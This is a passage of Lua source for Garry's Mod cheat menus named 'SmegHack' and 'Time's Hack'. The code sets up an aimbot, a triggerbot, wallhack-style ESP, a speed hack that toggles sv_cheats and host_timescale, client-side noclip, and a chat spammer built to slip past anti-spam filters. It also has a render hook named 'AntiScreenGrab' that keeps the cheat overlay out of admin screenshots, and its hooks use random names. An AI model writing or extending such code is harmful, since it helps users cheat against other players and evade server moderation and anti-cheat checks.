	AddBoneButton( Aimbot, 490, 255, "ValveBiped.Bip01_Pelvis" )
	AddBoneButton( Aimbot, 470, 160, "ValveBiped.Bip01_R_UpperArm" )
	AddBoneButton( Aimbot, 450, 140, "ValveBiped.Bip01_R_Forearm" )
	AddBoneButton( Aimbot, 430, 130, "ValveBiped.Bip01_R_Hand" )
	AddBoneButton( Aimbot, 510, 165, "ValveBiped.Bip01_L_UpperArm" )
	AddBoneButton( Aimbot, 530, 140, "ValveBiped.Bip01_L_Forearm" )
	AddBoneButton( Aimbot, 550, 130, "ValveBiped.Bip01_L_Hand" )
	AddBoneButton( Aimbot, 470, 275, "ValveBiped.Bip01_R_Thigh" )
	AddBoneButton( Aimbot, 450, 295, "ValveBiped.Bip01_R_Calf" )
	AddBoneButton( Aimbot, 430, 305, "ValveBiped.Bip01_R_Foot" )
	AddBoneButton( Aimbot, 410, 305, "ValveBiped.Bip01_R_Toe0" )
	AddBoneButton( Aimbot, 510, 275, "ValveBiped.Bip01_L_Thigh" )
	AddBoneButton( Aimbot, 530, 295, "ValveBiped.Bip01_L_Calf" )
	AddBoneButton( Aimbot, 550, 305, "ValveBiped.Bip01_L_Foot" )
	AddBoneButton( Aimbot, 570, 305, "ValveBiped.Bip01_L_Toe0" )

	AddGenericButton( Aimbot, "Fill", 85, 30, 400, 325, function()
		for k, v in pairs(SmegHack.Bones) do
			if !table.HasValue( SmegHack.BoneOrder, v ) then
				table.insert( SmegHack.BoneOrder, v )
			end
		end
		UpdateBoneThink = true
	end)
	AddGenericButton( Aimbot, "Clear", 85, 30, 495, 325, function()
		table.Empty( SmegHack.BoneOrder )
		UpdateBoneThink = true
	end)
	

	//ESP Tab
	AddCheckBox( ESP, "ESP", 15, 45, "Enables/Disables ESP", "ESP_Toggle" )
	AddCheckBox( ESP, "Team", 15, 65, "Draw/Ignore ESP for players on your team", "ESP_ShowTeam" )
	AddCheckBox( ESP, "Opponents", 15, 85, "Draw/Ignore ESP for players not on your team", "ESP_ShowOpponents" )
	AddCheckBox( ESP, "Friends", 15, 105, "Draw/Ignore ESP for players on your friends list", "ESP_ShowFriends" )
	AddCheckBox( ESP, "Enemies", 15, 125, "Draw/Ignore ESP for players on your enemies list", "ESP_ShowEnemies" )
	AddCheckBox( ESP, "NPCs", 15, 145, "Draw/Ignore ESP for NPCs", "ESP_ShowNPCs" )
	AddCheckBox( ESP, "Spectators", 15, 165, "Draw/Ignore ESP for spectators", "ESP_ShowSpectators" )

	AddComboBox( ESP, 100, 65, 70, 15, "ESP_ShowTeamV", {"Show", "Ignore"} )
	AddComboBox( ESP, 100, 85, 70, 15, "ESP_ShowOpponentsV", {"Show", "Ignore"} )
	AddComboBox( ESP, 100, 105, 70, 15, "ESP_ShowFriendsV", {"Show", "Ignore"} )
	AddComboBox( ESP, 100, 125, 70, 15, "ESP_ShowEnemiesV", {"Show", "Ignore"} )
	AddComboBox( ESP, 100, 145, 70, 15, "ESP_ShowNPCsV", {"Show", "Ignore"} )
	AddComboBox( ESP, 100, 165, 70, 15, "ESP_ShowSpectatorsV", {"Show", "Ignore"} )

	AddCheckBox( ESP, "Boundary Boxes", 15, 190, "Display a box around players", "ESP_BoundaryBoxes" )
	AddComboBox( ESP, 120, 190, 35, 15, "ESP_BoundaryBoxes_Mode", { "2D", "3D" } )
	AddCheckBox( ESP, "Name Tags", 15, 210, "Display player names", "ESP_NameTags" )
	AddCheckBox( ESP, "Weapon", 15, 230, "Display equipped weapon of players", "ESP_Weapon" )
	AddCheckBox( ESP, "Distance", 15, 250, "Display distance between you and other players", "ESP_Distance" )
	AddCheckBox( ESP, "Health", 15, 270, "Display health of players", "ESP_Health" )
	AddCheckBox( ESP, "Skeleton", 15, 290, "Draws the skeleton of players", "ESP_Skeleton" )
	AddCheckBox( ESP, "Crosshair", 15, 310, "Draws crosshair on screen", "ESP_Crosshair" )
	AddGenericButton( ESP, "Customize", 80, 15, 90, 310, function() ChangeTab(CustomCrosshair,15) end )

	AddCheckBox( ESP, "Entity ESP", 185, 65, "Draw ESP for selected entities", "ESP_Entity_Toggle" )
	AddCheckBox( ESP, "Name Tags", 185, 85, "Draw ESP for selected entities", "ESP_Entities_NameTags" )
	AddCheckBox( ESP, "Boundary Boxes", 185, 105, "Draw ESP for selected entities", "ESP_Entities_BoundaryBoxes" )
	AddComboBox( ESP, 290, 105, 40, 15, "ESP_Entities_BoundaryBoxes_Mode", { "2D", "3D" } )

	//Crosshair Custimization
	AddGenericButton( CustomCrosshair, "<-- Finished   ", 100, 20, 25, 335, function () ChangeTab( ESP, 3 ) end )
	AddLabel( CustomCrosshair, "Size:", 15, 60 )
	AddLabel( CustomCrosshair, "Mode:", 15, 80)
	AddSlider( CustomCrosshair, "ESP_Crosshair_Size", 50, 60, 1, ScrW()/2, 0 )
	AddComboBox( CustomCrosshair, 50, 80, 105, 15, "ESP_Crosshair_Mode", { "Team", "Custom" } )

	local Mixer = vgui.Create( "DColorMixer", CustomCrosshair )
	Mixer:SetSize( 250, 160 )
	Mixer:SetPos( 335, 60 )
	Mixer:SetPalette( false )
	Mixer:SetAlphaBar( true )
	Mixer:SetWangs( true )
	if SmegHack.Options["ESP_Crosshair_Mode"] == "Team" then
		Mixer:SetColor( team.GetColor(LocalPlayer():Team()) )
	else
		Mixer:SetColor( Color(SmegHack.Options["ESP_Crosshair_Color_R"], SmegHack.Options["ESP_Crosshair_Color_G"], SmegHack.Options["ESP_Crosshair_Color_B"], SmegHack.Options["ESP_Crosshair_Color_A"]) )
	end
	Mixer.Think = function()
		if SmegHack.Options["ESP_Crosshair_Mode"] == "Custom" then
			SmegHack.Options["ESP_Crosshair_Color_R"] = Mixer:GetColor().r
			SmegHack.Options["ESP_Crosshair_Color_G"] = Mixer:GetColor().g
			SmegHack.Options["ESP_Crosshair_Color_B"] = Mixer:GetColor().b
		end
		SmegHack.Options["ESP_Crosshair_Color_A"] = Mixer:GetColor().a
	end

	//Ents Tab
	local ESPOffEntsList = vgui.Create("DListView", Ents)
	ESPOffEntsList:SetPos( 25, 55 )
	ESPOffEntsList:SetSize( 225, 295 )
	ESPOffEntsList:SetMultiSelect(false)
	ESPOffEntsList:AddColumn("Off ESP")
	
	local ESPOnEntsList = vgui.Create("DListView", Ents)
	ESPOnEntsList:SetPos( 350, 55 )
	ESPOnEntsList:SetSize( 225, 295 )
	ESPOnEntsList:SetMultiSelect(false)
	ESPOnEntsList:AddColumn("On ESP")
	
	function RefreshEntsList()
		ESPOnEntsList:Clear()
		ESPOffEntsList:Clear()
		for k, v in pairs( SmegHack.EntityESP ) do
			ESPOnEntsList:AddLine(v)
		end
		for k, v in pairs( ents.GetAll() ) do
			local Name = v:GetClass()
			local Copy = false
			if Name != "player" then
				if !table.HasValue( SmegHack.EntityESP, Name ) then
					for k, v in pairs (ESPOffEntsList:GetLines() ) do
						if v:GetValue(1) == Name then Copy = true end
					end
					if Copy == false then ESPOffEntsList:AddLine(Name) end
				end
			end
		end
	end
	RefreshEntsList()
	
	AddGenericButton( Ents, "Refresh", 80, 30, 260, 55, function() RefreshEntsList() end )
	AddGenericButton( Ents, "------->", 80, 30, 260, 167.5, function()
		if ESPOffEntsList:GetSelectedLine() != nil then
			table.insert( SmegHack.EntityESP, ESPOffEntsList:GetLine(ESPOffEntsList:GetSelectedLine()):GetValue(1) )
		end
		RefreshEntsList()
	end)
	AddGenericButton( Ents, "<-------", 80, 30, 260, 207.5, function()
		if ESPOnEntsList:GetSelectedLine() != nil then
			for k, v in pairs( SmegHack.EntityESP ) do
				if v == ESPOnEntsList:GetLine(ESPOnEntsList:GetSelectedLine()):GetValue(1) then
					table.remove( SmegHack.EntityESP, k )
				end
			end
		end
		RefreshEntsList()
	end)
	AddGenericButton( Ents, "Add All", 80, 30, 260, 95, function()
		for k, v in pairs( ESPOffEntsList:GetLines() ) do
			table.insert( SmegHack.EntityESP, v:GetValue(1) )
		end
		RefreshEntsList() 
	end)
	AddGenericButton( Ents, "Clear Ents", 80, 30, 260, 280, function() table.Empty( SmegHack.EntityESP ) RefreshEntsList() end )
	AddGenericButton( Ents, "Manage Saves", 80, 30, 260, 320, function() ChangeTab(EntitySaves, 14) end )
	
	//Entity Saves Manager
	AddSavePage( EntitySaves, "Entities" )
	AddGenericButton( EntitySaves, "<-- Finished   ", 100, 20, 25, 335, function () ChangeTab( Ents, 4 ) end )

	//Misc Tab
	AddCheckBox( Misc, "Clock Speed Manipulator", 15, 45, "Speed hack", "Misc_Clock", function()
		if SmegHack.Options["Misc_Clock"] then
			TimeScaleChange = true
		else
			LocalPlayer():ConCommand("incrementvar sv_cheats "..NormSvCheats.." "..NormSvCheats.." "..NormSvCheats)
			LocalPlayer():ConCommand("incrementvar host_timescale "..NormHostTimeScale.." "..NormHostTimeScale.." "..NormHostTimeScale)
		end
	end)
	AddSlider( Misc, "Misc_Clock_Speed", 160, 45, 0, 10, 0 )
	AddComboBox( Misc, 300, 45, 50, 15, "Misc_Clock_Mode", {"Fast", "Slow"}, function() TimeScaleChange = true end )

	AddCheckBox( Misc, "Admin Box", 15, 65, "Display all admins in a box", "Misc_AdminBox", function()
		if SmegHack.Options["Misc_AdminBox"] then
			AddDisplayBox( "Admins", 1 )
		end
	end)
	AddComboBox( Misc, 120, 65, 90, 15, "Misc_AdminBox_Mode", {"Auto", "Top Left", "Top Right", "Bottom Left", "Bottom Right"} )
	AddCheckBox( Misc, "Spectators Box", 15, 85, "Display all people spectating you in a box", "Misc_SpectatorsBox", function()
		if SmegHack.Options["Misc_SpectatorsBox"] then
			AddDisplayBox( "Spectators", 2 )
		end
	end)
	AddComboBox( Misc, 120, 85, 90, 15, "Misc_SpectatorsBox_Mode", {"Auto", "Top Left", "Top Right", "Bottom Left", "Bottom Right"} )
	
	//Friends Tab
	local FriendsList = vgui.Create("DListView", Friends)
	FriendsList:SetPos( 25, 55 )
	FriendsList:SetSize( 275, 200 )
	FriendsList:SetMultiSelect(false)
	FriendsList:AddColumn("Player Name")
	FriendsList:AddColumn("Steam ID")
	
	local EnemiesList = vgui.Create("DListView", Friends)
	EnemiesList:SetPos( 300, 55 )
	EnemiesList:SetSize( 275, 200 )
	EnemiesList:SetMultiSelect(false)
	EnemiesList:AddColumn("Player Name")
	EnemiesList:AddColumn("Steam ID")
	
	function RefreshFriendsList()
		FriendsList:Clear()
		EnemiesList:Clear()
		for k, v in pairs(player.GetAll()) do
			if v != LocalPlayer() then
				if SmegHack.Options["Friends_SteamFriends"] && v:GetFriendStatus() == "friend" then
					if !table.HasValue(SmegHack.FriendsList, v:SteamID()) then table.insert(SmegHack.FriendsList, v:SteamID()) end
				end
				if SmegHack.Options["Friends_SteamEnemies"] && v:GetFriendStatus() == "friend" then
					local PlayerSteamID = v:SteamID()
					for k, v in pairs(SmegHack.FriendsList) do
						if v == PlayerSteamID then
							table.remove(SmegHack.FriendsList, k)
						end
					end
					if table.HasValue(SmegHack.FriendsList, v:SteamID()) then table.remove(SmegHack.FriendsList, v:SteamID()) end
				end
				if SmegHack.Options["Friends_FriendIsEnemy"] then
					if table.HasValue(SmegHack.FriendsList, v:SteamID()) then
						EnemiesList:AddLine(v:Nick(), v:SteamID())
					else
						FriendsList:AddLine(v:Nick(), v:SteamID())
					end
				else
					if table.HasValue(SmegHack.FriendsList, v:SteamID()) then
						FriendsList:AddLine(v:Nick(), v:SteamID())
					else
						EnemiesList:AddLine(v:Nick(), v:SteamID())
					end
				end
			end
		end
	end
	RefreshFriendsList()
	
	AddMainMenuButton( Friends, "Remove Friend", 112.5, 260, function()
		local SelectedLine = FriendsList:GetSelectedLine()
		if SelectedLine != nil then
			local PlayerNick = FriendsList:GetLine(SelectedLine):GetValue(1)
			local PlayerSteamID = FriendsList:GetLine(SelectedLine):GetValue(2)
			if SmegHack.Options["Friends_FriendIsEnemy"] then
				table.insert(SmegHack.FriendsList, PlayerSteamID)
			else
				for k, v in pairs(SmegHack.FriendsList) do
					if v == PlayerSteamID then
						table.remove(SmegHack.FriendsList, k)
						break
					end
				end
			end
			RefreshFriendsList()
		end
	end)
	
	AddMainMenuButton( Friends, "Add Friend", 387.5, 260, function()
		local SelectedLine = EnemiesList:GetSelectedLine()
		if SelectedLine != nil then
			local PlayerNick = EnemiesList:GetLine(SelectedLine):GetValue(1)
			local PlayerSteamID = EnemiesList:GetLine(SelectedLine):GetValue(2)
			if SmegHack.Options["Friends_FriendIsEnemy"] then
				for k, v in pairs(SmegHack.FriendsList) do
					if v == PlayerSteamID then
						table.remove(SmegHack.FriendsList, k)
						break
					end
				end
			else
				table.insert(SmegHack.FriendsList, PlayerSteamID)
			end
			RefreshFriendsList()
		end
	end)
	
	AddMainMenuButton( Friends, "Refresh List", (Friends:GetWide()/2)-50, 260, function() RefreshFriendsList() end )
	AddMainMenuButton( Friends, "Manage Saves", (Friends:GetWide()/2)-50, 300, function() ChangeTab( FriendSaves, 13 ) end )
	AddMainMenuButton( Friends, "Clear Friends", 387.5, 300, function() table.Empty( SmegHack.FriendsList ) RefreshFriendsList() end )
	AddCheckBox( Friends, "Friend Is Enemy", 5, 265, "Turns the friends list into the enemies list", "Friends_FriendIsEnemy", function() RefreshFriendsList() end )
	AddCheckBox( Friends, "Steam Friends", 5, 285, "Make your friends on steam automatically appear on the friends list", "Friends_SteamFriends", function() RefreshFriendsList() end )
	AddCheckBox( Friends, "Steam Enemies", 5, 305, "Make your friends on steam automatically appear on the enemies list", "Friends_SteamEnemies", function() RefreshFriendsList() end )
	
	//Manage Friend Saves
	AddSavePage( FriendSaves, "Friends" )
	AddGenericButton( FriendSaves, "<-- Finished   ", 100, 20, 25, 335, function () ChangeTab( Friends, 6 ) end )

	//Cams Tab
	AddCheckBox( Cams, "Cams", 15, 45, "Enables/Disables cams hacks", "Cams_Toggle" )
	AddCheckBox( Cams, "Client Side Noclip", 15, 65, "Fly around the map freely (everyone else on the server wont see you flying)", "Cams_CSNoclip" )
	AddSlider( Cams, "Cams_CSNoclip_Speed", 125, 65, 0, 100, 0 )
	AddCheckBox( Cams, "Thirdperson", 15, 85, "An over shoulder view", "Cams_ThirdPerson" )
	AddSlider( Cams, "Cams_ThirdPerson_Zoom", 125, 85, 0, 100, 0 )

	//Bhop Tab
	AddCheckBox( Bhop, "Bhop", 15, 45, "Enables/Disables Bhop hacks", "Bhop_Toggle" )
	AddCheckBox( Bhop, "Fast Walk", 15, 65, "Makes you walk slightly faster", "Bhop_FastWalk" )
	AddCheckBox( Bhop, "Auto Hop", 15, 85, "Hold space to bhop", "Bhop_AutoHop" )
	AddCheckBox( Bhop, "Auto Strafe", 15, 105, "Automatically turns in the air", "Bhop_AutoStrafe")
	AddCheckBox( Bhop, "Edge Jump", 15, 125, "Jumps just before an edge", "Bhop_EdgeJump")
	AddSlider( Bhop, "Bhop_EdgeJump_Distance", 100, 125, 0, 100, 0 )
	AddCheckBox( Bhop, "Sideways", 15, 145, "Turns your camera so you can bhop normally while in Sideways mode", "Bhop_Sideways")
	AddCheckBox( Bhop, "W-Only", 15, 165, "Turns your camera so you can bhop normally while in W-Only mode", "Bhop_WOnly")

	//Spam Tab
	AddCheckBox( Spam, "Spam", 15, 45, "Enables/Disables Chat Spammer", "Spam_Toggle" )
	AddCheckBox( Spam, "Delay", 15, 65, "Pauses between each spam for x seeconds", "Spam_Delay" )
	AddSlider( Spam, "Spam_Delay_Value", 80, 65, 0, 10, 2 )
	AddCheckBox( Spam, "Anti-Anti-Spam", 15, 85, "Adds a random number to the end of your message to help avoid Anti-Spammers", "Spam_AntiAntiSpam" )

	AddCheckBox( Spam, "Message 1", 15, 265, "Enable spam message #1", "Spam_Message_1" )
	AddCheckBox( Spam, "Message 2", 15, 285, "Enable spam message #2", "Spam_Message_2" )
	AddCheckBox( Spam, "Message 3", 15, 305, "Enable spam message #3", "Spam_Message_3" )
	AddCheckBox( Spam, "Message 4", 15, 325, "Enable spam message #4", "Spam_Message_4" )
	AddCheckBox( Spam, "Message 5", 15, 345, "Enable spam message #5", "Spam_Message_5" )
	AddTextEntry( Spam, 485, 100, 262, "", "Spam1", true )
	AddTextEntry( Spam, 485, 100, 282, "", "Spam2", true )
	AddTextEntry( Spam, 485, 100, 302, "", "Spam3", true )
	AddTextEntry( Spam, 485, 100, 322, "", "Spam4", true )
	AddTextEntry( Spam, 485, 100, 342, "", "Spam5", true )
	
	//Config Tab
	AddSavePage( Config, "Configs" )
	
	if SmegHack.ActiveTab == nil then SmegHack.ActiveTab = 1 end
	if SmegHack.ActiveTab == 1 then ChangeTab( Main, 1 )
	elseif SmegHack.ActiveTab == 2 then ChangeTab( Aimbot, 2 )
	elseif SmegHack.ActiveTab == 3 then ChangeTab( ESP, 3 )
	elseif SmegHack.ActiveTab == 4 then ChangeTab( Ents, 4 )
	elseif SmegHack.ActiveTab == 5 then ChangeTab( Misc, 5 )
	elseif SmegHack.ActiveTab == 6 then ChangeTab( Friends, 6 )
	elseif SmegHack.ActiveTab == 7 then ChangeTab( Cams, 7 )
	elseif SmegHack.ActiveTab == 8 then ChangeTab( Bhop, 8 )
	elseif SmegHack.ActiveTab == 9 then ChangeTab( Spam, 9 )
	elseif SmegHack.ActiveTab == 10 then ChangeTab( Test10, 10 )
	elseif SmegHack.ActiveTab == 11 then ChangeTab( Test11, 11 )
	elseif SmegHack.ActiveTab == 12 then ChangeTab( Config, 12 )
	elseif SmegHack.ActiveTab == 13 then ChangeTab ( FriendSaves, 13 )
	elseif SmegHack.ActiveTab == 14 then ChangeTab ( EntitySaves, 14 )
	elseif SmegHack.ActiveTab == 15 then ChangeTab ( CustomCrosshair, 15 ) end

	function CloseMenu()
		MenuOpen = false
		Menu:Close()
	end
end
LoadSmegHack(true)

end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Time`s Hack" )
DermaButton:SetPos( 0, 30 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	--=================== Pre Cache ================

surface.CreateFont("ESP_Font_Main",{font = "comfortaa", size = 18})
surface.CreateFont("ESP_Font_Flag",{font = "Arial", size = 12})
surface.CreateFont("questionMarkFont",{font = "Arial", size = 17, weight = 500,})
surface.CreateFont("netFont", {font = "Verdana", size = 15, weight = 100,})

local config = {}
local teamFilterSelected = {}
config.colors = {}
config.keybinds = {}

config["aim_master_toggle"] = false
config["aim_onkey"] = false
config["aim_norecoil"] = false
config["aim_prediction"] = false
config["aim_target"] = 1
config["aim_hitbox"] = 1
config["aim_fov"] = 30
config["aim_smoothing"] = false
config["aim_smoothing_value"] = 0
config["aim_ignorefriends"] = false

config["trigger_master_toggle"] = false
config["trigger_onkey"] = false


config["esp_player_box"] = false
config["esp_player_name"] = false
config["esp_player_hp"] = false
config["esp_player_armor"] = false
config["esp_player_weapon"] = false
config["esp_player_rank"] = false
config["esp_player_team"] = false
config["esp_player_skeleton"] = false
config["esp_player_snaplines"] = false
config["esp_player_glow"] = false
config["esp_player_chams"] = false
config["esp_player_chams_xyz"] = false
config["esp_player_chams_material"] = 1
config["esp_player_render_distance"] = 4000
config["esp_player_filtering"] = false
config["esp_player_highlight_box"] = false
config["esp_player_highlight_name"] = false

config["esp_other_fog"] = false
config["esp_other_fog_start"] = 0
config["esp_other_fog_end"] = 9000
config["esp_other_fog_density"] = 0.8
config["esp_other_nightmode"] = false
config["esp_other_nightmode_scale"] = 0.4
config["esp_other_hitsound"] = false
config["esp_other_drawfov"] = false
config["esp_other_fullbright"] = false
config["esp_other_thirdperson"] = false
config["esp_other_thirdperson_distance"] = 15

config["misc_autobunnyhop"] = false
config["misc_autostrafe"] = false
config["misc_ttt"] = false
config["misc_observerlist"] = false
config["misc_rainbow"] = false	
config["misc_rainbow_speed"] = 20

config["config_name"] = nil

config.colors["esp_player_box"] = "255 255 255 255"
config.colors["esp_player_name"] = "255 255 255 255"
config.colors["esp_player_hp"] = "0 255 0 255"
config.colors["esp_player_armor"] = "66 138 245 255"
config.colors["esp_player_weapon"] = "255 255 255 255"
config.colors["esp_player_rank"] = "255 0 0 255"
config.colors["esp_player_skeleton"] = "255 255 255 255"
config.colors["esp_player_snaplines"] = "255 255 255 255"
config.colors["esp_player_glow"] = "0 140 255 255"
config.colors["esp_player_chams"] = "30 111 146 255"
config.colors["esp_player_chams_xyz"] = "0 63 160 63"
config.colors["esp_player_highlight_box"] = "0 255 0 255"
config.colors["esp_player_highlight_name"] = "0 255 0 255"
config.colors["esp_other_fog"] = "118 144 184 255"
config.colors["esp_other_drawfov"] = "255 255 255 255"

config.keybinds["aim_onkey_key"] = 0
config.keybinds["trigger_onkey_key"] = 0
config.keybinds["menu_key"] = 72
config.keybinds["logger_key"] = 74
config.keybinds["thirdperson_key"] = 0

config["friends"] = {}

local verifyconfig = config

local KeyBinds = {[0] = "NONE", [1] = "0", [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "A", [12] = "B", [13] = "C", [14] = "D", [15] = "E", [16] = "F", [17] = "G", [18] = "H", [19] = "I", [20] = "J", [21] = "K", [22] = "L", [23] = "M", [24] = "N", [25] = "O", [26] = "P", [27] = "Q", [28] = "R", [29] = "S", [30] = "T", [31] = "U", [32] = "V", [33] = "W", [34] = "X", [35] = "Y", [36] = "Z", [37] = "PAD_0", [38] = "PAD_1", [39] = "PAD_2", [40] = "PAD_3", [41] = "PAD_4", [42] = "PAD_5", [43] = "PAD_6", [44] = "PAD_7", [45] = "PAD_8", [46] = "PAD_9", [47] = "PAD_DIVIDE", [48] = "PAD_MULTIPLY", [49] = "PAD_MINUS", [50] = "PAD_PLUS", [51] = "PAD_ENTER", [52] = "PAD_DECIMAL", [53] = "LBRACKET", [54] = "RBRACKET", [55] = "SEMICOLON", [56] = "APOSTROPHE", [57] = "BACKQUOTE", [58] = "COMMA", [59] = "PERIOD", [60] = "SLASH", [61] = "BACKSLASH", [62] = "MINUS", [63] = "EQUAL", [64] = "ENTER", [65] = "SPACE", [66] = "BACKSPACE", [67] = "TAB", [68] = "CAPSLOCK", [69] = "NUMLOCK", [70] = "ESCAPE", [71] = "SCROLLLOCK", [72] = "INSERT", [73] = "DELETE", [74] = "HOME", [75] = "END", [76] = "PAGEUP", [77] = "PAGEDOWN", [78] = "BREAK", [79] = "LSHIFT", [80] = "RSHIFT", [81] = "LALT", [82] = "RALT", [83] = "LCONTROL", [84] = "RCONTROL", [85] = "LWIN", [86] = "RWIN", [87] = "APP", [88] = "UP", [89] = "LEFT", [90] = "DOWN", [91] = "RIGHT", [92] = "F1", [93] = "F2", [94] = "F3", [95] = "F4", [96] = "F5", [97] = "F6", [98] = "F7", [99] = "F8", [100] = "F9", [101] = "F10", [102] = "F11", [103] = "F12"}
local MouseBinds = {[107] = "MOUSE_LEFT", [108] = "MOUSE_RIGHT", [109] = "MOUSE_MIDDLE", [110] = "MOUSE_4", [111] = "MOUSE_5", [112] = "MOUSE_WHEEL_UP", [113] = "MOUSE_WHEEL_DOWN"}

local exploit_menu, frame, frameX, frameY, sheet, teamFilter, teamFilterX, teamFilterY, colorWindow, teamList, teamFilter, teamFilterWasOpen, teamFilterEnable, teamFilterX, teamFilterY, pList, pListWasOpen, cfgDropdown
local activeTab
local loadedCfg = {}
local editingText = false
local observingPlayers = {}
observingPlayers.watcher = {}
observingPlayers.spec = {}
local files, dir = file.Find( "timeshack/*.json", "DATA" )
local frametime, deviation = engine.ServerFrameTime()

--=================== Misc Functions ================

local function RandomString() return tostring(math.random(-9999999999, 9999999999)) end

function VerifyConfig()
	for k, v in pairs(verifyconfig) do
		if config[k] == nil then
			config[k] = verifyconfig[k]
			MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "The config value ", Color(255, 0, 0), k, Color(222, 222, 222), " was nil. To prevent errors in the cheat it has been set to the default value automatically. Please make sure to save your config with your desired settings to prevent this in the future.")
		end
	end
	for k, v in pairs(verifyconfig.colors) do
		if config.colors[k] == nil then
			if k == "config_name" then return end
			config.colors[k] = verifyconfig.colors[k]
			MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "The colour config value ", Color(255, 0, 0), k, Color(222, 222, 222), " was nil. To prevent errors in the cheat it has been set to the default value automatically. Please make sure to save your config with your desired settings to prevent this in the future.")
		end
	end
	for k, v in pairs(verifyconfig.keybinds) do
		if config.keybinds[k] == nil then
			config.keybinds[k] = verifyconfig.keybinds[k]
			MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "The keybind config value ", Color(255, 0, 0), k, Color(222, 222, 222), " was nil. To prevent errors in the cheat it has been set to the default value automatically. Please make sure to save your config with your desired settings to prevent this in the future.")
		end
	end
end

function GetENTPos ( Ent )
	if Ent:IsValid() then 
		local Points = {
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z )
		}
		local MaxX, MaxY, MinX, MinY
		local V1, V2, V3, V4, V5, V6, V7, V8
		local isVis
		for k, v in pairs( Points ) do
			local ScreenPos = Ent:LocalToWorld( v ):ToScreen()
			isVis = ScreenPos.visible
			if MaxX != nil then
				MaxX, MaxY, MinX, MinY = math.max( MaxX, ScreenPos.x ), math.max( MaxY, ScreenPos.y), math.min( MinX, ScreenPos.x ), math.min( MinY, ScreenPos.y)
			else
				MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
			end

			if V1 == nil then
				V1 = ScreenPos
			elseif V2 == nil then
				V2 = ScreenPos
			elseif V3 == nil then
				V3 = ScreenPos
			elseif V4 == nil then
				V4 = ScreenPos
			elseif V5 == nil then
				V5 = ScreenPos
			elseif V6 == nil then
				V6 = ScreenPos
			elseif V7 == nil then
				V7 = ScreenPos
			elseif V8 == nil then
				V8 = ScreenPos
			end
		end
		return MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8, isVis
	end
end

local fakeRT = GetRenderTarget( "fakeRT" .. os.time(), ScrW(), ScrH() )
 
hook.Add( "RenderScene", "AntiScreenGrab", function( vOrigin, vAngle, vFOV )
    local view = {
        x = 0,
        y = 0,
        w = ScrW(),
        h = ScrH(),
        dopostprocess = true,
        origin = vOrigin,
        angles = vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }
 
    render.RenderView( view )
    render.CopyTexture( nil, fakeRT )
 
    cam.Start2D()
        hook.Run( "CheatHUDPaint" )
    cam.End2D()
 
    render.SetRenderTarget( fakeRT )
 
    return true
end )
 
hook.Add( "ShutDown", "RemoveAntiScreenGrab", function()
    render.SetRenderTarget()
end )

function ValidateESP(ply)
	if ply:IsBot() or ply:IsPlayer() then
		if ( IsValid(ply) && ply != LocalPlayer() && ply:Alive() && ply:GetPos():Distance(LocalPlayer():GetPos()) <= config["esp_player_render_distance"] ) then
			if !table.IsEmpty(teamFilterSelected) && config["esp_player_filter"] then
				for k, v in pairs(teamFilterSelected) do
					if team.GetName(ply:Team()) == v then
						return true
					end
				end
			else
				return true
			end
		else
			return false
		end
	end
end

function ValidateAimbot(ply)
	if ply:IsBot() or ply:IsPlayer() then
		if ply:GetMoveType() == MOVETYPE_NOCLIP then return end
		if config["aim_ignorefriends"] then
			if table.HasValue(config["friends"], ply:SteamID()) then
				return false
			end
		end
		if ( IsValid(ply) && ply != LocalPlayer() && ply:Alive() && ply:Team() != TEAM_SPECTATOR && !ply:IsDormant() && ply:GetPos():Distance(LocalPlayer():GetPos()) <= config["esp_player_render_distance"] ) then
			if !table.IsEmpty(teamFilterSelected) && config["esp_player_filter"] then
				for k, v in pairs(teamFilterSelected) do
					if team.GetName(ply:Team()) == v then
						return true
					end
				end
			else
				return true
			end
		else
			return false
		end
	end
end

local playerTable = {}

hook.Add("Think", RandomString(), function()
	for k, v in pairs(player.GetAll()) do
		if ValidateESP(v) && !table.HasValue(playerTable, v) then
			table.insert(playerTable, v)
		elseif !ValidateESP(v) && table.HasValue(playerTable, v) then
			table.RemoveByValue(playerTable, v)
		end
	end
end)

function CloseFrame()
	frameX, frameY = frame:GetPos()
	RememberCursorPosition()
	frame:Remove()
	frame = false
end

function SaveConfig()

	if cfgDropdown:GetSelected() == nil then return end
	
	local cfg = cfgDropdown:GetSelected()
	local JSONconfig = util.TableToJSON(config, true)
	file.Write("timeshack/"..cfg, JSONconfig)

	MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "Saved Config - ", Color(255, 0, 0), cfg, "\n")

end

function LoadDefault()

	local JSONconfig = file.Read("timeshack/default.json", "DATA")
	config = util.JSONToTable(JSONconfig)

	VerifyConfig()

	loadedCfg[0] = "default.json"
	for k, v in ipairs(files) do
		if v == "default.json" then
			loadedCfg[1] = k
		end
	end

	MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "Loaded Default Config\n")

end

function LoadConfig()

	if cfgDropdown:GetSelected() == nil then return end

	local cfg = cfgDropdown:GetSelected()
	local JSONconfig = file.Read("timeshack/"..cfg, "DATA")
	config = util.JSONToTable(JSONconfig)

	VerifyConfig()

	loadedCfg[0] = cfg
	for k, v in ipairs(files) do
